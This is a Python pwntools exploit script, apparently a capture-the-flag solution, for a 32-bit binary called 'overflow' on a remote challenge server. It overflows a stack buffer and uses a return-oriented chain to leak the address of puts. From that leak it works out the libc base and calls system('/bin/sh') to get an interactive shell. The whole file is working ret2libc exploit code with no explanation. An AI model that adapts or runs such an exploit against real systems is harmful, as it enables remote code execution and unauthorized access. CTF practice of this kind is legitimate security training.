from pwn import *
context(os="linux",arch="i386",log_level="debug")
#p=process("./overflow")
p=remote("node5.buuoj.cn",27853)
elf=ELF("overflow")

def debug():
    gdb.attach(p)
    pause()

#libc=ELF("libc-2.23.so")
#sys_addr=libc.sym["system"]
#print("sys_addr :",hex(sys_addr))
main_addr=elf.sym["main"]
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
payload1=b"a"*0x24+p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.recvuntil(b"name?\n")
p.sendline(payload1)
#p.recvuntil(".")
puts_addr=u32(p.recvuntil(b"\xf7")[-4:])
#puts_addr=u32(p.recv(4))
print("puts_addr :",hex(puts_addr))
#libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so")
libc=ELF("libc-2.23.so")
libc_base=puts_addr-libc.sym["puts"]
sys_addr=libc_base+libc.sym["system"]
binsh_addr=libc_base+next(libc.search(b"/bin/sh\x00"))
payload2=b"a"*0x24+p32(sys_addr)+p32(main_addr)+p32(binsh_addr)
p.recvuntil(b"name?\n")
p.sendline(payload2)
p.interactive()
#main2_addr=elf.sym["main"]
#print("main1_addr :",hex(main1_addr))
#print("main2_addr :",hex(main2_addr))
